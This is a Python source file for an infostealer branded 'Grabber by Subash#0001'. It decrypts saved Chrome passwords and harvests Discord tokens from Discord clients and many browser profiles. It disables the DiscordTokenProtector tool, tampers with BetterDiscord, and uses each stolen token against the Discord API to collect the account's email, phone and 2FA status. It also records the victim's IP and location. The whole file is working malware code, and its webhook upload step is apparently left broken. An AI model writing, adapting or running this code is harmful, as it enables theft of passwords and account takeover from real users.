from base64 import b64decode
from re import findall
import threading,os,shutil,sqlite3,json,base64,requests
from urllib.request import urlopen
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import win32crypt,psutil
from discord_webhook import DiscordWebhook,DiscordEmbed
def grabber():
	h='\\tokens';g='TEMP';f='\\Google\\Chrome\\User Data\\profile 1\\Login Data';e='rb';d='\\Google\\Chrome\\User Data\\Local State';c='\\Google\\Chrome\\User Data\\default\\Login Data';b='encrypted_key';a='os_crypt';Z='utf-8';Y='appdata';X='localappdata';O='cp437';N='r';M='temp';K='w';J='';G=None;E='ignore';H=J;P='http://ipinfo.io/json';Q=urlopen(P);B=json.load(Q);R=os.getlogin();S=str(B['ip']);i=B['org'];j=B['city'];T=B['country'];U=':flag_'+T.lower()+':';k=B['region'];V=str(round(psutil.virtual_memory().total/1024.0**3))+' GB';A=os.getenv('APPDATA');l=f"IP adress: {S}\nCountry: {U}\n";m=f"Username: {R}\nRam: {V}\n";A=os.getenv(X);n=os.getenv(Y);I=os.getenv(M);o=os.environ['USERPROFILE']
	def L(locals_state,logins_db,filename):
		I='\\Loginvault.db';A=os.getenv(M)
		def L(cipher,payload):return cipher.decrypt(payload)
		def P(aes_key,iv):return AES.new(aes_key,AES.MODE_GCM,iv)
		def Q(buff,master_key):
			try:B=buff[3:15];C=buff[15:];D=P(master_key,B);A=L(D,C);A=A[:-16].decode();return A
			except Exception as E:print(str(E))
		try:
			def R():
				with open(locals_state,N,encoding=Z)as C:B=C.read();B=json.loads(B)
				A=base64.b64decode(B[a][b]);A=A[5:];A=win32crypt.CryptUnprotectData(A,G,G,G,0)[1];return A
			if __name__=='__main__':
				S=R();T=logins_db;shutil.copy2(T,A+I);D=sqlite3.connect(A+I);B=D.cursor();F=open(filename,K,encoding=O,errors=E);F.write('Passwords Grabber Made by Subash#0001:\n\n')
				try:
					B.execute('SELECT action_url, username_value, password_value FROM logins')
					for C in B.fetchall():
						H=C[0];U=C[1];V=C[2];W=Q(V,S);A=os.getenv(M)
						if H!=J:F.write(f"==> Domain: {H}\n==> User: {U}\n== >Pass: {W}\n\n")
				except Exception as X:pass
				B.close();D.close()
				try:os.remove(A+I)
				except Exception as X:pass
		except FileNotFoundError:pass
	if os.path.isfile(A+c):
		locals=A+d;D=A+c;C=I+'\\chromep'
		try:
			L(logins_db=D,filename=C,locals_state=locals)
			with open(C,e)as F:H.add_file(file=F.read(),filename='Chrome Default.txt')
		except:pass
	if os.path.isfile(A+f):
		locals=A+d;D=A+f;C=I+'\\chromep_1'
		try:
			L(logins_db=D,filename=C,locals_state=locals)
			with open(C,e)as F:H.add_file(file=F.read(),filename='Chrome Profile 1.txt')
		except:pass
	def W():
		o='\\Mozilla\\Firefox\\Profiles';n='ldb';m='log';l='Discord';k='a';j=True;C=False;M=os.getenv(g)+h
		with open(M,K)as P:P.write('Tokens');P.close
		def U(path):
			with open(path,N,encoding=Z)as B:C=B.read()
			D=json.loads(C);A=b64decode(D[a][b]);A=A[5:];A=CryptUnprotectData(A,G,G,G,0)[1];return A
		def V(buff,master_key):
			try:B=buff[3:15];C=buff[15:];D=AES.new(master_key,AES.MODE_GCM,B);A=D.decrypt(C);A=A[:-16].decode();return A
			except Exception:return'Failed to decrypt password'
		A=os.getenv(X);B=os.getenv(Y);Q='[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}';W='dQw4w9WgXcQ:[^\\"]*'
		def c():
			I=':)';G=f"{B}\\DiscordTokenProtector\\"
			if not os.path.exists(G):return
			F=G+'config.json'
			for H in ['DiscordTokenProtector.exe','ProtectionPayload.dll','secure.dat']:
				try:os.remove(G+H)
				except FileNotFoundError:pass
			if os.path.exists(F):
				with open(F,errors=E)as D:
					try:A=json.load(D)
					except json.decoder.JSONDecodeError:return
					A[I]=I;A['auto_start']=C;A['auto_start_discord']=C;A['integrity']=C;A['integrity_allowbetterdiscord']=C;A['integrity_checkexecutable']=C;A['integrity_checkhash']=C;A['integrity_checkmodule']=C;A['integrity_checkscripts']=C;A['integrity_checkresource']=C;A['integrity_redownloadhashes']=C;A['iterations_iv']=364;A['iterations_key']=457;A['version']=69420
				with open(F,K)as D:json.dump(A,D,indent=2,sort_keys=j)
				with open(F,k)as D:D.write('\n\n//:)')
		def d():
			A=B+'\\BetterDiscord\\data\\betterdiscord.asar'
			if os.path.exists(A):
				D='api/webhooks'
				with open(A,N,encoding=O,errors=E)as C:F=C.read();G=F.replace(D,'RdimoTheGoat')
				with open(A,K,newline=J,encoding=O,errors=E)as C:C.write(G)
		try:d();c()
		except:pass
		e={l:B+'\\\\discord\\\\Local Storage\\\\leveldb\\\\','Discord Canary':B+'\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\','Lightcord':B+'\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\','Discord PTB':B+'\\\\discordptb\\\\Local Storage\\\\leveldb\\\\','Opera':B+'\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\','Opera GX':B+'\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\','Amigo':A+'\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb\\\\','Torch':A+'\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb\\\\','Kometa':A+'\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb\\\\','Orbitum':A+'\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb\\\\','CentBrowser':A+'\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb\\\\','7Star':A+'\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb\\\\','Sputnik':A+'\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb\\\\','Vivaldi':A+'\\\\Vivaldi\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\','Chrome SxS':A+'\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb\\\\','Chrome':A+'\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\','Chrome1':A+'\\\\Google\\\\Chrome\\\\User Data\\\\Profile 1\\\\Local Storage\\\\leveldb\\\\','Chrome2':A+'\\\\Google\\\\Chrome\\\\User Data\\\\Profile 2\\\\Local Storage\\\\leveldb\\\\','Chrome3':A+'\\\\Google\\\\Chrome\\\\User Data\\\\Profile 3\\\\Local Storage\\\\leveldb\\\\','Chrome4':A+'\\\\Google\\\\Chrome\\\\User Data\\\\Profile 4\\\\Local Storage\\\\leveldb\\\\','Chrome5':A+'\\\\Google\\\\Chrome\\\\User Data\\\\Profile 5\\\\Local Storage\\\\leveldb\\\\','Chrome6':A+'\\\\Google\\\\Chrome\\\\User Data\\\\Profile 6\\\\Local Storage\\\\leveldb\\\\','Chrome7':A+'\\\\Google\\\\Chrome\\\\User Data\\\\Profile 7\\\\Local Storage\\\\leveldb\\\\','Chrome8':A+'\\\\Google\\\\Chrome\\\\User Data\\\\Profile 8\\\\Local Storage\\\\leveldb\\\\','Chrome9':A+'\\\\Google\\\\Chrome\\\\User Data\\\\Profile 9\\\\Local Storage\\\\leveldb\\\\','Chrome10':A+'\\\\Google\\\\Chrome\\\\User Data\\\\Profile 10\\\\Local Storage\\\\leveldb\\\\','Epic Privacy Browser':A+'\\\\Epic Privacy Browser\\\\User Data\\\\Local Storage\\\\leveldb\\\\','Microsoft Edge':A+'\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\','Microsoft Edge1':A+'\\\\Microsoft\\\\Edge\\\\User Data\\\\Profile 1\\\\Local Storage\\\\leveldb\\\\','Microsoft Edge2':A+'\\\\Microsoft\\\\Edge\\\\User Data\\\\Profile 2\\\\Local Storage\\\\leveldb\\\\','Microsoft Edge3':A+'\\\\Microsoft\\\\Edge\\\\User Data\\\\Profile 3\\\\Local Storage\\\\leveldb\\\\','Microsoft Edge4':A+'\\\\Microsoft\\\\Edge\\\\User Data\\\\Profile 4\\\\Local Storage\\\\leveldb\\\\','Microsoft Edge5':A+'\\\\Microsoft\\\\Edge\\\\User Data\\\\Profile 5\\\\Local Storage\\\\leveldb\\\\','Microsoft Edge6':A+'\\\\Microsoft\\\\Edge\\\\User Data\\\\Profile 6\\\\Local Storage\\\\leveldb\\\\','Microsoft Edge7':A+'\\\\Microsoft\\\\Edge\\\\User Data\\\\Profile 7\\\\Local Storage\\\\leveldb\\\\','Microsoft Edge8':A+'\\\\Microsoft\\\\Edge\\\\User Data\\\\Profile 8\\\\Local Storage\\\\leveldb\\\\','Microsoft Edge9':A+'\\\\Microsoft\\\\Edge\\\\User Data\\\\Profile 9\\\\Local Storage\\\\leveldb\\\\','Microsoft Edge10':A+'\\\\Microsoft\\\\Edge\\\\User Data\\\\Profile 10\\\\Local Storage\\\\leveldb\\\\','Microsoft Edgee':A+'\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul\\\\Local Storage\\\\leveldb\\\\','Uran':A+'\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\','Yandex':A+'\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\','Brave':A+'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\','Brave1':A+'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Profile 1\\\\Local Storage\\\\leveldb\\\\','Brave2':A+'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Profile 2\\\\Local Storage\\\\leveldb\\\\','Brave3':A+'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Profile 3\\\\Local Storage\\\\leveldb\\\\','Brave4':A+'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Profile 4\\\\Local Storage\\\\leveldb\\\\','Brave5':A+'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Profile 5\\\\Local Storage\\\\leveldb\\\\','Brave6':A+'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Profile 6\\\\Local Storage\\\\leveldb\\\\','Brave7':A+'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Profile 7\\\\Local Storage\\\\leveldb\\\\','Brave8':A+'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Profile 8\\\\Local Storage\\\\leveldb\\\\','Brave9':A+'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Profile 9\\\\Local Storage\\\\leveldb\\\\','Brave10':A+'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Profile 10\\\\Local Storage\\\\leveldb\\\\','Iridium':A+'\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\'}
		def L(tokens,platform):
			I='Authorization';B=tokens;D={I:B};J=requests.get('https://discordapp.com/api/v8/auth/login',headers=D)
			if J.status_code==200:
				D={I:B};K={I:B,'Content-Type':'application/json'};E=requests.get('https://discord.com/api/v8/users/@me',headers=K);A=E.json()
				if E.status_code==200:
					L=A['username']+'#'+A['discriminator'];N=A['id'];O=A['phone'];P=A['email'];Q=A['mfa_enabled'];R=A['verified'];S=A['flags'];G=C
					if'premium_type'in A:G=j
					format=f"""
> {F}
                     
Username: {L}
Nitro: {G}
Id:{N}
Email: {P}
Verified: {R}
Phone: {O}
2FAEnabled: {Q}
Falgs: {S}
Platform: {platform}
        
                     *******Grabber by Subash#0001********
                     """
					with open(M,k)as H:H.write(format);H.close
		for (R,D) in e.items():
			if not os.path.exists(D):continue
			S=R.replace(' ',J).lower()
			if'cord'in D:
				if os.path.exists(B+f"\\{S}\\Local State"):
					for H in os.listdir(D):
						if H[-3:]not in[m,n]:continue
						for I in [A.strip()for A in open(f"{D}\\{H}",errors=E).readlines()if A.strip()]:
							for f in findall(W,I):
								F=V(b64decode(f.split('dQw4w9WgXcQ:')[1]),U(B+f"\\{S}\\Local State"))
								try:L(tokens=F,platform=l)
								except:pass
			else:
				for H in os.listdir(D):
					if H[-3:]not in[m,n]:continue
					for I in [A.strip()for A in open(f"{D}\\{H}",errors=E).readlines()if A.strip()]:
						for F in findall(Q,I):
							try:L(tokens=F,platform=R)
							except:pass
		if os.path.exists(B+o):
			for (D,p,i) in os.walk(B+o):
				for T in i:
					if not T.endswith('.sqlite'):continue
					for I in [A.strip()for A in open(f"{D}\\{T}",errors=E).readlines()if A.strip()]:
						for F in findall(Q,I):
							try:L(tokens=F,platform='Firefox')
							except:pass
	try:W();p=os.getenv(g)+h
	except:pass
grabber()
